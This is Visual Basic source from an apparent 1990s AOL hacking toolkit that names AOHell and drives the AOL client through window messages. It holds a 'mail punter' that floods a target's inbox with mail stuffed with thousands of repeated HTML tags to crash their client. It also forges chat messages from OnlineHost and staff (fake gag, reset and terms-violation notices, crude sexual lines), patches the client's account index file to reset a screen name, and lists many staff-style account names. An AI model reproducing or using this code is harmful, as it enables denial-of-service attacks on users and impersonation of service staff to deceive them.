Manip "Haha I Maniped Your Fool Ass. !!!"
timeout (30)
Manipx "Hot Jacki", "Ohh God, " + UserSN() + " now do me from behind. !!!"
timeout 15
Manipx "OnlineHost", "TOSAdvisor has left the room."
timeout (13)
Manipx "OnlineHost", UserSN() + "  has been gagged"
timeout (20)
timeout 20
Manipx "OnlineHost", "TOSDonC  has been  bumped"
timeout (31)
Manipx "OnlineHost", UserSN() + "  has been reset"
Manipx "OnlineHost", "To review this account goto keyword cris."
timeout (20)
Manipx "Guide TOE", UserSN() + ", Scrolling is a Violation Of the Terms of Service"
Manipx "Guide TOE", "Please Stop NOW and Use Keyword: TOS to Review These Terms!"
timeout (20)
Manipx "OnlineHost", "AACTchrLes has entered the room."
timeout 15
Manipx "OnlineHost", "AFC Sally has entered the room."
timeout 10
Manipx "AFC Sally", "I suggest you all leave this room :)"
timeout 15
Manipx "OnlineHost", "ABCHostTIG has entered the room."
timeout 20
Manipx "OnlineHost", "AARepFlare has entered the room."
timeout (20)
Manipx "AARepFlare", "Hey doesnt my program own ?"
timeout 5
Manipx "OnlineHost", "Host Ank has left the room."
timeout 30
Manipx "OnlineHost", "Rnger RCT has entered the room."
timeout 10
Manipx "OnlineHost", "Guide ARG has entered the room."
timeout 10
Manipx "OnlineHost", "Guide TBG has entered the room."
timeout 10
Manipx "OnlineHost", "TOSReports has entered the room."
timeout 10
Manipx "OnlineHost", "SpareTire has entered the room."
timeout 10
Manipx "OnlineHost", "Guide PDX has entered the room."
timeout 10
Manipx "OnlineHost", "Guide SLW has entered the room."
timeout 10
Manipx "OnlineHost", "KO Banshee has entered the room."
timeout 20
Manipx "Guide NAC", "Yes ?"
timeout (10)
Manipx "Bob Evens", "Jimmie Dean Owns Me"
timeout (30)
Manipx "OnlineHost", "CATWatch01 has entered the room."
timeout (12)
Manip "Haha I Maniped Your Fool Ass. !!!"
timeout (30)
Manipx "Hot Jacki", "Ohh God, " + UserSN() + " now do me from behind. !!!"
timeout 15
Manipx "OnlineHost", "TOSAdvisor has left the room."
timeout (13)
Manipx "OnlineHost", UserSN() + "  has been gagged"
timeout (20)
timeout 20
Manipx "OnlineHost", "TOSDonC  has been  bumped"
timeout (31)
Manipx "OnlineHost", UserSN() + "  has been reset"
Manipx "OnlineHost", "To review this account goto keyword cris."
timeout (20)
Manipx "Guide TOE", UserSN() + ", Scrolling is a Violation Of the Terms of Service"
Manipx "Guide TOE", "Please Stop NOW and Use Keyword: TOS to Review These Terms!"
timeout (20)
Manipx "OnlineHost", "AACTchrLes has entered the room."
timeout 15
Manipx "OnlineHost", "AFC Sally has entered the room."
timeout 10
Manipx "AFC Sally", "I suggest you all leave this room :)"
timeout 15
Manipx "OnlineHost", "ABCHostTIG has entered the room."
timeout 20
Manipx "OnlineHost", "AARepFlare has entered the room."
timeout (20)
Manipx "AARepFlare", "Hey doesnt my program own ?"
timeout 5
Manipx "OnlineHost", "Host Ank has left the room."
timeout 30
Manipx "OnlineHost", "Rnger RCT has entered the room."
timeout 10
Manipx "OnlineHost", "Guide ARG has entered the room."
timeout 10
Manipx "OnlineHost", "Guide TBG has entered the room."
timeout 10
Manipx "OnlineHost", "TOSReports has entered the room."
timeout 10
Manipx "OnlineHost", "SpareTire has entered the room."
timeout 10
Manipx "OnlineHost", "Guide PDX has entered the room."
timeout 10
Manipx "OnlineHost", "Guide SLW has entered the room."
timeout 10
Manipx "OnlineHost", "KO Banshee has entered the room."
timeout 20
Manipx "Guide NAC", "Yes ?"
timeout 50
Loop

End Sub

Sub loadaol ()
On Error Resume Next
Dim x
x = Shell("C:\aol30\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol30a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol30b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol25\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol25a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol25b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub

Sub LoadComboBox (ByVal Directory, cbo As ComboBox)
On Error Resume Next
Open Directory For Input As #1
While Not EOF(1)
Input #1, Text$
DoEvents
cbo.AddItem Text$
Wend
Close #1
End Sub

Sub Loadlistbox (Directory, Lst As ListBox)
On Error Resume Next
Open Directory For Input As #1
While Not EOF(1)
Input #1, Text$
DoEvents
Lst.AddItem Text$
Wend
Close #1

End Sub

Sub locate (who)
a = findwindow("AOL Frame25", 0&)  'Find the AOL Window
Call RunMenuByString(a, "Locate a Member Online") 'Our RunMenu Function
Do: DoEvents                          'this loads the KW screen.
x = findchildbytitle(a, "Locate Member Online")    'Find the KW Screen.
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT")  'Find the edit screen to
                'place the Keyword in.
kw = who
c = sendmessagebystring(b, WM_SETTEXT, 0, kw) 'Put our KW in.
d = findchildbyclass(x, "_AOL_BUTTON_")        'Find the GO Button.
d = findchildbytitle(x, "OK")
e = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
e = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)   'Up Click
subcd0 (.2)
z = sendmessagebynum(x, WM_CLOSE, 0, 0)

End Sub

 Sub MailPref ()
 If Online() = False Then : MsgBox "You Are Not Currectly Signed On To Your America Online Client", 59
AOL% = findwindow("AOL Frame25", 0&)
RunMenu "Mem&bers", "Preferences"
Do
DoEvents
Pref% = findchildbytitle(AOL%, "Preferences")
Loop Until Pref% > 0
ml% = findchildbytitle(AOL%, "Mail")
Mails% = GetWindow(ml%, GW_HWNDNEXT)
click Mails%
Do
DoEvents
MailPrefs% = findwindow("_AOL_MODAL", "Mail Preferences")
Loop Until MailPrefs%
CheckMe% = findchildbytitle(MailPrefs%, "Confirm mail after it has been sent")
Q% = SendMessage(CheckMe%, BM_SETCHECK, False, 0&)
CheckMe2% = findchildbytitle(MailPrefs%, "Close mail after it has been sent")
Q% = SendMessage(CheckMe2%, BM_SETCHECK, False, 0&)
Clo% = findchildbytitle(MailPrefs%, "OK")
click Clo%
CG% = findchildbyclass(AOL%, "Preferences")
CloseWin (CG%)
Do
DoEvents
Loop Until CG% = 0

End Sub

Sub mailpunter (who, subject)
Dim Punt
Punt = "Black Death Mail Punter<H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3><H3> + punt2"
punt2 = "<BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>"
aolsendmail who, subject, Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt + Punt

End Sub

Sub mailtolist (Lst As ListBox)
AOL = findwindow("AOL Frame25", 0&)
bah = findchildbyclass(AOL, "_AOL_Tree")
If bah = 0 Then Exit Sub
coun = sendmessagebynum(bah, LB_GETCOUNT, 0, 0)
Do
baha$ = String(255, " ")
x = sendmessagebystring(bah, LB_GETTEXT, a, baha$)
baha$ = Trim$(baha$)
a = 1 + a
Lst.AddItem baha$
Loop Until a > coun

End Sub

Sub makeaolparent (Frm As Form)
AOL% = findchildbyclass(findwindow("AOL Frame25", 0&), "MDIClient")
SetAsParent = setparent(Frm.hWnd, AOL%)
End Sub

Sub MakeAOLToolBar (Frm As Form)
a = findwindow("AOL Frame25", 0&)
AOL% = findchildbyclass(a, "AOL Toolbar")
SetAsParent = setparent(Frm.hWnd, a)

End Sub

Sub Manip (ByVal txt As String)
x = findsn() 'Calls our custon get Screen Name Function
name1$ = x
Mess$ = txt$
View% = findchildbyclass(findchatroom(), "_AOL_VIEW")
SendMe$ = CStr(Chr(13) & Chr(10) & name1$ + ":" & Chr(9) & Mess$)
change% = sendmessagebystring(View%, WM_SETTEXT, 0, SendMe$)

End Sub

Sub Manipx (SN, txt)
name1$ = SN
Mess$ = txt
View% = findchildbyclass(findchatroom(), "_AOL_VIEW")
SendMe$ = CStr(Chr(13) & Chr(10) & name1$ + ":" & Chr(9) & Mess$)
change% = sendmessagebystring(View%, WM_SETTEXT, 0, SendMe$)

End Sub

Sub newuser (Direc$, SName$)
GoTo Benn

reseterrr:
Exit Sub


Benn:
On Error GoTo reseterrr





If SName$ = "" Or Len(SName$) < 7 Then
MsgBox "The screen name to replace must be at least 7 characters long (spaces count).  AOHell will replace that screen name with ""NewUser"".", 16, "Name Error"
Exit Sub
End If
If Direc$ = "" Then
MsgBox "Must specify a directory!", 16, "Need Directory"
Exit Sub
End If

Direc1$ = Direc$ + "\idb\main.idx"


NU$ = "New User "

If Len(SName$) = 7 Then
NU$ = "New User "
End If
If Len(SName$) = 8 Then
NU$ = "New User  "
End If
If Len(SName$) = 9 Then
NU$ = "New User   "
End If
If Len(SName$) = 10 Then
NU$ = "New User    "
End If

DoEvents
Call pause(2)
Call ChangeFile(Direc1$, SName$, NU$)
DoEvents

thiswin% = findwindow("AOL Frame25", 0&)
find5% = findchildbytitle(thiswin%, "Welcome")
find6% = findchildbytitle(thiswin%, "Goodbye")

If find5% > 0 Then
CloseWin find5%
DoEvents
End If

If find6% > 0 Then
CloseWin find6%
DoEvents
End If


MsgBox "Screen Name Reset.                  '    FAccount.Show"

End Sub

Sub OH_Names (List As ListBox)
List.AddItem "AAC2Teach"
List.AddItem "AAC2tor4u"
List.AddItem "AACAcctLiz"
List.AddItem "AACAdJohn"
List.AddItem "AACAlgebra"
List.AddItem "AACAnimTch"
List.AddItem "AACAPTch"
List.AddItem "AACArchTek"
List.AddItem "AACArtArt"
List.AddItem "AACAskBio"
List.AddItem "AACBackDoc"
List.AddItem "AACBikeRPh"
List.AddItem "AACBioAgnt"
List.AddItem "AACBioBug"
List.AddItem "AACBioGS3"
List.AddItem "AACBioHous"
List.AddItem "AACBioHut"
List.AddItem "AACBioKen"
List.AddItem "AACBioLyn"
List.AddItem "AACBioMo"
List.AddItem "AACBioSci"
List.AddItem "AACBioSign"
List.AddItem "AACBioTch"
List.AddItem "AACBioTch1"
List.AddItem "AACBioTM"
List.AddItem "AACBioTutr"
List.AddItem "AACBioWhiz"
List.AddItem "AACBizSam"
List.AddItem "AACBusEd"
List.AddItem "AACCharis"
List.AddItem "AACChemAu"
List.AddItem "AACChemCE"
List.AddItem "AACChemDAS"
List.AddItem "AACChemDr"
List.AddItem "AACChemMan"
List.AddItem "AACChemPhy"
List.AddItem "AACChmA1A"
List.AddItem "AACChmAmi"
List.AddItem "AACChmDrT"
List.AddItem "AACChmH2O"
List.AddItem "AACChmHLM"
List.AddItem "AACChmInst"
List.AddItem "AACChmProf"
List.AddItem "AACChmSci"
List.AddItem "AACChmTigr"
List.AddItem "AACChmTony"
List.AddItem "AACLDTeac"
List.AddItem "AACmsAlina"
List.AddItem "AACCoachB"
List.AddItem "AACCoachK"
List.AddItem "AACCoachPK"
List.AddItem "AACCoachT"
List.AddItem "AACCompute"
List.AddItem "AACCplTim"
List.AddItem "AACCrimLaw"
List.AddItem "AACDaveTch"
List.AddItem "AACDocChem"
List.AddItem "AACDocHist"
List.AddItem "AACDocRob"
List.AddItem "AACDr1abd"
List.AddItem "AACDr57M"
List.AddItem "AACDr7Fe"
List.AddItem "AACDrAce"
List.AddItem "AACDrAlchm"
List.AddItem "AACDrAnP"
List.AddItem "AACDrAsh"
List.AddItem "AACDrAsha1"
List.AddItem "AACDrAVIMA"
List.AddItem "AACDrAVL"
List.AddItem "AACDrAvo"
List.AddItem "AACDrBach"
List.AddItem "AACDrBart"
List.AddItem "AACDrBert"
List.AddItem "AACDrBeth"
List.AddItem "AACDrBob"
List.AddItem "AACDrBones"
List.AddItem "AACDrBwulf"
List.AddItem "AACDrChris"
List.AddItem "AACDrCnnea"
List.AddItem "AACDrDan"
List.AddItem "AACDrDar"
List.AddItem "AACDrDave"
List.AddItem "AACDrDavid"
List.AddItem "AACDrDay"
List.AddItem "AACDrDC"
List.AddItem "AACDrDenis"
List.AddItem "AACDrDJ"
List.AddItem "AACDrDLC"
List.AddItem "AACDrDlfin"
List.AddItem "AACDrDoe"
List.AddItem "AACDrdoole"
List.AddItem "AACDrDunm"
List.AddItem "AACDrE"
List.AddItem "AACDrEl"
List.AddItem "AACDrFizik"
List.AddItem "AACDrFloc"
List.AddItem "AACDrFrank"
List.AddItem "AACDrGee"
List.AddItem "AACDrGenet"
List.AddItem "AACDrGramr"
List.AddItem "AACDrGriff"
List.AddItem "AACDrGV"
List.AddItem "AACDrHuman"
List.AddItem "AACDrIG"
List.AddItem "AACDrIon"
List.AddItem "AACDrJefef"
List.AddItem "AACDrJLH"
List.AddItem "AACDrJoe"
List.AddItem "AACDrJohn"
List.AddItem "AACDrJosh"
List.AddItem "AACDrJWM"
List.AddItem "AACDrKaye"
List.AddItem "AACDrKenn"
List.AddItem "AACDrKstrl"
List.AddItem "AACDrLatin"
List.AddItem "AACDrLgl"
List.AddItem "AACDrLee"
List.AddItem "AACDrLew"
List.AddItem "AACDrLit"
List.AddItem "AACDrLit56"
List.AddItem "AACDrLucie"
List.AddItem "AACDrLynne"
List.AddItem "AACDrMac"
List.AddItem "AACDrMark"
List.AddItem "AACDrMath"
List.AddItem "AACDrMills"
List.AddItem "AACDrMoon"
List.AddItem "AACDrMrsC"
List.AddItem "AACDrNeale"
List.AddItem "AACDrOBGYN"
List.AddItem "AACDrOtter"
List.AddItem "AACDrPaul"
List.AddItem "AACDrPDK"
List.AddItem "AACDrPDLaw"
List.AddItem "AACDrPepr"
List.AddItem "AACDrPel"
List.AddItem "AACDrPG"
List.AddItem "AACDrPhil"
List.AddItem "AACDrPhrog"
List.AddItem "AACDrphysk"
List.AddItem "AACDrPsych"
List.AddItem "AACDrRam"
List.AddItem "AACDrRaven"
List.AddItem "AACDrRealE"
List.AddItem "AACDrRedox"
List.AddItem "AACDrReid"
List.AddItem "AACDrRGBiv"
List.AddItem "AACDrRR"
List.AddItem "AACDrRxn"
List.AddItem "AACDrSailr"
List.AddItem "AACDrShel"
List.AddItem "AACDrShrmp"
List.AddItem "AACDrSid"
List.AddItem "AACDrSmall"
List.AddItem "AACDrSpine"
List.AddItem "AACDrSport"
List.AddItem "AACDrSSH"
List.AddItem "AACDrStars"
List.AddItem "AACDrSteph"
List.AddItem "AACDrTerry"
List.AddItem "AACDrTime"
List.AddItem "AACDrToad"
List.AddItem "AACDrTodd"
List.AddItem "AACDrTomm"
List.AddItem "AACDrTomDC"
List.AddItem "AACDrTrig"
List.AddItem "AACDrVadya"
List.AddItem "AACDrWade"
List.AddItem "AACDrWilb"
List.AddItem "AACDrWS"
List.AddItem "AACEdadmin"
List.AddItem "AACEdGrace"
List.AddItem "AACEduABC2"
List.AddItem "AACEduBibl"
List.AddItem "AACEduCLS"
List.AddItem "AACEducjed"
List.AddItem "AACEduGA"
List.AddItem "AACEduHaj"
List.AddItem "AACEduJim"
List.AddItem "AACEduJo"
List.AddItem "AACEduKtor"
List.AddItem "AACEduLaur"
List.AddItem "AACEdulin"
List.AddItem "AACEduMsB"
List.AddItem "AACEduRob"
List.AddItem "AACEduRRL"
List.AddItem "AACEduSoar"
List.AddItem "AACEduSuzy"
List.AddItem "AACEduWolf"
List.AddItem "AACEERJV"
List.AddItem "AACEgrDave"
List.AddItem "AACEng1"
List.AddItem "AACEngAppl"
List.AddItem "AACEngBarr"
List.AddItem "AACEngBoni"
List.AddItem "AACEngBry"
List.AddItem "AACEngBus"
List.AddItem "AACEngckk"
List.AddItem "AACEngDjm"
List.AddItem "AACEngFun"
List.AddItem "AACEngElf"
List.AddItem "AACEngGuru"
List.AddItem "AACEngJch"
List.AddItem "AACEngJrnT"
List.AddItem "AACEngKat"
List.AddItem "AACEnglcom"
List.AddItem "AACEngLit"
List.AddItem "AACEngNuke"
List.AddItem "AACEngPat"
List.AddItem "AACEngPen"
List.AddItem "AACEngPSD"
List.AddItem "AACEngSoni"
List.AddItem "AACEngStar"
List.AddItem "AACEngTchr"
List.AddItem "AACEngThom"
List.AddItem "AACEngTutr"
List.AddItem "AACEngZuZu"
List.AddItem "AACeyedoc"
List.AddItem "AACFamDoc"
List.AddItem "AACFrchSpa"
List.AddItem "AACFrenchT"
List.AddItem "AACFrHisto"
List.AddItem "AACFrnEng"
List.AddItem "AACFrogTch"
List.AddItem "AACGailRN"
List.AddItem "AACGaSciGy"
List.AddItem "AACGasLaw"
List.AddItem "AACGerEng"
List.AddItem "AACHal"
List.AddItem "AACHistARB"
List.AddItem "AACHistBrM"
List.AddItem "AACHistGuy"
List.AddItem "AACHistIra"
List.AddItem "AACHistJen"
List.AddItem "AACHistLa"
List.AddItem "AACHistMed"
List.AddItem "AACHistMrM"
List.AddItem "AACHstMOPA"
List.AddItem "AACHistNat"
List.AddItem "AACHistNY"
List.AddItem "AACHistTch"
List.AddItem "AACHistTes"
List.AddItem "AACHlthPE"
List.AddItem "AACHostKNG"
List.AddItem "AACHstRoss"
List.AddItem "AACiainPhD"
List.AddItem "AACInstCat"
List.AddItem "AACInstCSA"
List.AddItem "AACInstDan"
List.AddItem "AACInstGrn"
List.AddItem "AACInstKim"
List.AddItem "AACInstrJo"
List.AddItem "AACInstRCR"
List.AddItem "AACInstrJC"
List.AddItem "AACInstrKR"
List.AddItem "AACInstrRN"
List.AddItem "AACITEach"
List.AddItem "AACJan"
List.AddItem "AACJonTch"
List.AddItem "AACJournJm"
List.AddItem "AACJrnProf"
List.AddItem "AACjtTeach"
List.AddItem "AACJudeTch"
List.AddItem "AACKKEduc"
List.AddItem "AACLangDoc"
List.AddItem "AACLATchr"
List.AddItem "AACLawHist"
List.AddItem "AACLawLiz"
List.AddItem "AACLawTech"
List.AddItem "AACLitDoc"
List.AddItem "AACLitDot"
List.AddItem "AACLitLady"
List.AddItem "AACLitTc"
List.AddItem "AACLPNLisa"
List.AddItem "AACLv2Tch"
List.AddItem "AACMacTchr"
List.AddItem "AACMatDust"
List.AddItem "AACMath121"
List.AddItem "AACMath135"
List.AddItem "AACMath314"
List.AddItem "AACMath952"
List.AddItem "AACMathAL"
List.AddItem "AACMathALH"
List.AddItem "AACMathAmy"
List.AddItem "AACMathBLS"
List.AddItem "AACMathCal"
List.AddItem "AACMathCM"
List.AddItem "AACMathCor"
List.AddItem "AACMathCpt"
List.AddItem "AACMathCTW"
List.AddItem "AACMathFrn"
List.AddItem "AACMathJaZ"
List.AddItem "AACMathJC"
List.AddItem "AACMathJEL"
List.AddItem "AACMathJer"
List.AddItem "AACMathJF"
List.AddItem "AACMathJJ"
List.AddItem "AACMathJoe"
List.AddItem "AACMathJR"
List.AddItem "AACMathKar"
List.AddItem "AACMathLDW"
List.AddItem "AACMathLrn"
List.AddItem "AACMathMan"
List.AddItem "AACMathMat"
List.AddItem "AACMathMax"
List.AddItem "AACMathMD7"
List.AddItem "AACMathme"
List.AddItem "AACMathMJ"
List.AddItem "AACMathMJF"
List.AddItem "AACMathMO"
List.AddItem "AACMathMom"
List.AddItem "AACMathMoo"
List.AddItem "AACMathMRS"
List.AddItem "AACMathPKA"
List.AddItem "AACMathRbk"
List.AddItem "AACMathRon"
List.AddItem "AACMathRox"
List.AddItem "AACMathSal"
List.AddItem "AACMathSAW"
List.AddItem "AACMathSCM"
List.AddItem "AACMathSeb"
List.AddItem "AACMathSHS"
List.AddItem "AACMathSte"
List.AddItem "AACMathStu"
List.AddItem "AACMathSue"
List.AddItem "AACMathSV"
List.AddItem "AACMathTam"
List.AddItem "AACMathTch"
List.AddItem "AACMathTF4"
List.AddItem "AACMathTom"
List.AddItem "AACMathVan"
List.AddItem "AACMathVIR"
List.AddItem "AACMathWhz"
List.AddItem "AACMathWiz"
List.AddItem "AACMathWWM"
List.AddItem "AACMaxx"
List.AddItem "AACMBPeach"
List.AddItem "AACmecheng"
List.AddItem "AACMedCCRN"
List.AddItem "AACMedEmer"
List.AddItem "AACMedicPS"
List.AddItem "AACMedSci"
List.AddItem "AACMissA"
List.AddItem "AACMissAng"
List.AddItem "AACMissAmy"
List.AddItem "AACMissB"
List.AddItem "AACMissCyn"
List.AddItem "AACMissDy"
List.AddItem "AACMissH"
List.AddItem "AACMissKMB"
List.AddItem "AACMissLiz"
List.AddItem "AACMissP"
List.AddItem "AACMissT"
List.AddItem "AACMizMath"
List.AddItem "AACMR"
List.AddItem "AACMr1234"
List.AddItem "AACMrABC"
List.AddItem "AACMrAcct"
List.AddItem "AACMrAid"
List.AddItem "AACMrAIKO"
List.AddItem "AACMrAJPC"
List.AddItem "AACMrAlan"
List.AddItem "AACMrAlgem"
List.AddItem "AACMrAllen"
List.AddItem "AACMrAuto"
List.AddItem "AACMrAvion"
List.AddItem "AACMrB"
List.AddItem "AACMrBill"
List.AddItem "AACMrBill2"
List.AddItem "AACMrBrdge"
List.AddItem "AACMrC"
List.AddItem "AACMrCarey"
List.AddItem "AACMrCEng"
List.AddItem "AACMrCFB"
List.AddItem "AACMrChE"
List.AddItem "AACMrChris"
List.AddItem "AACMrCoach"
List.AddItem "AACMrCoop"
List.AddItem "AACMrCPA"
List.AddItem "AACMrCring"
List.AddItem "AACMrDavis"
List.AddItem "AACMrDrama"
List.AddItem "AACMrDW"
List.AddItem "AACMrE2Me"
List.AddItem "AACMrEarth"
List.AddItem "AACMrEMTP"
List.AddItem "AACMrFable"
List.AddItem "AACMrFlopy"
List.AddItem "AACMrFlwrs"
List.AddItem "AACMrFourB"
List.AddItem "AACMrGon"
List.AddItem "AACMrGov"
List.AddItem "AACMrGreg"
List.AddItem "AACMrGrow"
List.AddItem "AACMrH"
List.AddItem "AACMrHargi"
List.AddItem "AACMrHavoc"
List.AddItem "AACMrHeath"
List.AddItem "AACMrHNTR"
List.AddItem "AACMrHnttn"
List.AddItem "AACMrHunt"
List.AddItem "AACMrHyde"
List.AddItem "AACMrJames"
List.AddItem "AACMrJchem"
List.AddItem "AACMrJeff"
List.AddItem "AACMrJimbo"
List.AddItem "AACMrJNW"
List.AddItem "AACMrJohn"
List.AddItem "AACMrJtx"
List.AddItem "AACMrKCB"
List.AddItem "AACMrKD"
List.AddItem "AACMrKitt"
List.AddItem "AACMrKEW"
List.AddItem "AACMrKPD"
List.AddItem "AACMrL"
List.AddItem "AACMrLewis"
List.AddItem "AACMrLwPrf"
List.AddItem "AACMrM"
List.AddItem "AACMrMac"
List.AddItem "AACMrMagic"
List.AddItem "AACMrMarco"
List.AddItem "AACMrMath3"
List.AddItem "AACMrMathX"
List.AddItem "AACMrMathZ"
List.AddItem "AACMrMaze"
List.AddItem "AACMrMike"
List.AddItem "AACMrNozit"
List.AddItem "AACMrPhiby"
List.AddItem "AACMrPhrm"
List.AddItem "AACMrRay"
List.AddItem "AACMrRibs"
List.AddItem "AACMrRog"
List.AddItem "AACMrSal"
List.AddItem "AACMrScott"
List.AddItem "AACMrShaun"
List.AddItem "AACMrSirC"
List.AddItem "AACMrSky10"
List.AddItem "AACMrSpark"
List.AddItem "AACMrSpear"
List.AddItem "AACMrSteve"
List.AddItem "AACMrTBear"
List.AddItem "AACMrTeach"
List.AddItem "AACMrTiff"
List.AddItem "AACMrTJ"
List.AddItem "AACMrTony"
List.AddItem "AACMrUne"
List.AddItem "AACMrUno"
List.AddItem "AACMrV"
List.AddItem "AACMrVideo"
List.AddItem "AACMrXpert"
List.AddItem "AACMrZee"
List.AddItem "AACMrsA"
List.AddItem "AACMrsAlg"
List.AddItem "AACMrsAsk"
List.AddItem "AACMrsAtom"
List.AddItem "AACMrsBell"
List.AddItem "AACMrsBP"
List.AddItem "AACMrsD"
List.AddItem "AACMrsDee"
List.AddItem "AACMrsF"
List.AddItem "AACMrsH"
List.AddItem "AACMrsHart"
List.AddItem "AACMrsK"
List.AddItem "AACMrsLC"
List.AddItem "AACMrsM"
List.AddItem "AACMrsMac"
List.AddItem "AACMrsMath"
List.AddItem "AACMrsMJB"
List.AddItem "AACMrsN"
List.AddItem "AACMrsO"
List.AddItem "AACMrsP"
List.AddItem "AACMrsSal"
List.AddItem "AACMrsSul"
List.AddItem "AACMrsWolf"
List.AddItem "AACMsAct"
List.AddItem "AACMsAllen"
List.AddItem "AACMsAly"
List.AddItem "AACMsAnn"
List.AddItem "AACMsAnnie"
List.AddItem "AACMsanser"
List.AddItem "AACMsApple"
List.AddItem "AACMsAriel"
List.AddItem "AACMsBama"
List.AddItem "AACMsBasic"
List.AddItem "AACMsBean"
List.AddItem "AACMsBeata"
List.AddItem "AACMsBelle"
List.AddItem "AACMsBEngl"
List.AddItem "AACMsBook"
List.AddItem "AACMsBrava"
List.AddItem "AACMsBryte"
List.AddItem "AACMsCaEng"
List.AddItem "AACMsChief"
List.AddItem "AACMsCMF"
List.AddItem "AACMsCoop"
List.AddItem "AACMsCount"
List.AddItem "AACMsDarci"
List.AddItem "AACMsDawn"
List.AddItem "AACMsDebi"
List.AddItem "AACMsDee"
List.AddItem "AACMsdenis"
List.AddItem "AACMsDiana"
List.AddItem "AACMsDonna"
List.AddItem "AACMsDraya"
List.AddItem "AACMsEdFun"
List.AddItem "AACMsElisa"
List.AddItem "AACMsErase"
List.AddItem "AACMsEsq"
List.AddItem "AACMsEssie"
List.AddItem "AACMsFink"
List.AddItem "AACMsGEng"
List.AddItem "AACMsGlobe"
List.AddItem "AACMsGlyph"
List.AddItem "AACMsGramr"
List.AddItem "AACMsGreen"
List.AddItem "AACMsHist"
List.AddItem "AACMsHMW"
List.AddItem "AACMsHolly"
List.AddItem "AACMsHstry"
List.AddItem "AACMsInfo"
List.AddItem "AACMsJacki"
List.AddItem "AACMsJaime"
List.AddItem "AACMsJapan"
List.AddItem "AACMsJayne"
List.AddItem "AACMsJeane"
List.AddItem "AACMsJenny"
List.AddItem "AACMsJill"
List.AddItem "AACMsJoJo"
List.AddItem "AACMsJulia"
List.AddItem "AACMsKaren"
List.AddItem "AACMsKat"
List.AddItem "AACMsKathy"
List.AddItem "AACMsKell"
List.AddItem "AACMsKiddy"
List.AddItem "AACMsKris"
List.AddItem "AACMsL"
List.AddItem "AACMsLaLib"
List.AddItem "AACMsLeigh"
List.AddItem "AACMsLinda"
List.AddItem "AACMsLinde"
List.AddItem "AACMsLogic"
List.AddItem "AACMsLuAnn"
List.AddItem "AACMsLyann"
List.AddItem "AACMsMac"
List.AddItem "AACMsMagik"
List.AddItem "AACMsMAK"
List.AddItem "AACMsMarci"
List.AddItem "AACMsMath"
List.AddItem "AACMsMentr"
List.AddItem "AACMsMex"
List.AddItem "AACMsMolly"
List.AddItem "AACMsNavy"
List.AddItem "AACMsNibbs"
List.AddItem "AACMsNoun"
List.AddItem "AACMsNRSJD"
